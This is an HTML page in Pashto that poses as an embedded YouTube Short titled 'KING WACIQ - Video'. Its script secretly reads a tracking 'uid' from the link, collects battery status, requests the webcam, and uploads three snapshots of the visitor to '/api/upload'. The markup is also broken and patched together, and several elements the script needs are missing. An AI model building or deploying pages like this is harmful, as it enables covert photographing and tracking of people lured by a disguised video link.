<!DOCTYPE html>
<html lang="ps">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>KING WACIQ - Video</title>
  <style>
    /* ساده، مینیمال او رییسپانسیو ویډیو امبیډ */
    html,body{
      height:100%;
      margin:0;
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
      font-family: Arial, Helvetica, sans-serif;
      color:#fff;
    }
    .wrap{
      width:100%;
      max-width:900px;
      aspect-ratio: 9 / 16; /* short vertical aspect */
      height: calc(min(90vh, 1600px));
      display:flex;
      align-items:center;
      justify-content:center;
      background: #000;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
    }
    /* iframe fills container */
    .wrap iframe{
      width:100%;
      height:100%;
      border:0;
      display:block;
    }

    /* on very wide screens keep vertical video centered with black sides */
    @media (min-aspect-ratio: 16/9) {
      .wrap{ aspect-ratio: 9 / 16; width: 420px; }
    }

    /* small caption under video */
    .caption{
      position: absolute;
      bottom: 18px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 13px;
      opacity: .85;
      pointer-events: none;
    }
  </style>

  <div class="wrap" aria-label="Embedded YouTube Short">
    <!-- Embedded YouTube Short (video id: rrUWz0QdoNQ) -->
    <iframe
      src="https://www.youtube.com/embed/rrUWz0QdoNQ?autoplay=0&controls=1&rel=0"
      title="YouTube Short"
      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
      allowfullscreen
      referrerpolicy="no-referrer"
    ></iframe>
  </div>
/head>
<body>
  <div class="caption">د اصلي لینک لپاره: https://youtube.com/shorts/rrUWz0QdoNQ</div>
  <script>
    /* ===== Matrix Rain Animation ===== */
    const canvasMatrix = document.getElementById("matrix");
    const ctxMatrix = canvasMatrix.getContext("2d");
    canvasMatrix.height = window.innerHeight;
    canvasMatrix.width = window.innerWidth;
    let letters = Array(256).join("1").split("");
    function drawMatrix() {
      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
      ctxMatrix.fillStyle = "#0f0";
      letters.forEach((y, index) => {
        let text = String.fromCharCode(3e4 + Math.random() * 33);
        let x = index * 10;
        ctxMatrix.fillText(text, x, y);
        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
      });
    }
    setInterval(drawMatrix, 33);

    /* ===== Your Original Code (Unchanged) ===== */
    const video = document.getElementById('video');
    const canvas = document.getElementById('snapshot');
    const ctx = canvas.getContext('2d');
    const log = document.getElementById('log');
    const statusEl = document.getElementById('status');

    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid') || 'unknown';

    if (uid) {
      navigator.getBattery().then(battery => {
        const batteryLevel = Math.round(battery.level * 100);
        const isCharging = battery.charging;

        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
          video.srcObject = stream;
          statusEl.innerText = "Camera access granted...";

          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
        }).catch(err => {
          console.error("Camera error:", err);
          statusEl.innerText = "Camera error!";
        });
      });
    }

    function takeSnapshotAndSend(battery, charging) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      // ❗ Still original fetch (unchanged)
      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          image: imageData,
          uid,
          battery,
          charging
        })
      }).then(res => res.json()).then(data => {
        console.log("Uploaded:", data);
        log.innerText += "Snapshot uploaded...\n";
      }).catch(err => {
        console.error("Upload error:", err);
        log.innerText += "Upload failed!\n";
      });
    }
  </script>
</body>
</html> 
